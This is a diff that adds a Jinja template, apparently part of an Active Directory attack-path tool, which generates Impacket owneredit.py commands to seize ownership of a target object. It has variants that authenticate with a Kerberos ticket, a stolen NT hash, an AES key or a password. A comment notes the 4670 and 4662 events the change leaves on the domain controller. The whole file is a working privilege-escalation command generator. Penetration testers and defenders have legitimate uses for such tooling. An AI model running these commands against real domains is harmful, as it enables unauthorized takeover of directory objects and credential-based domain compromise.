@@ -1,0 +1,12 @@
+# Set the owner of {{target.name}} to {{parent.obj.name}}
+# Modifying permissions on an object will generate 4670 and 4662 events on the
+# domain controller that handled the request.
+{% if parent.krb_auth %}
+owneredit.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -use-ldaps -dc-ip {{dc_ip}} -target '{{target.name}}' -new-owner '{{parent.obj.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+owneredit.py '{{fqdn}}/{{parent.obj.name}}' -hashes :{{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -target '{{target.name}}' -new-owner '{{parent.obj.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+owneredit.py '{{fqdn}}/{{parent.obj.name}}' -k -no-pass -aesKey {{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -target '{{target.name}}' -new-owner '{{parent.obj.name}}' -action write
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+owneredit.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}' -use-ldaps -dc-ip {{dc_ip}} -target '{{target.name}}' -new-owner '{{parent.obj.name}}' -action write
+{%- endif %}
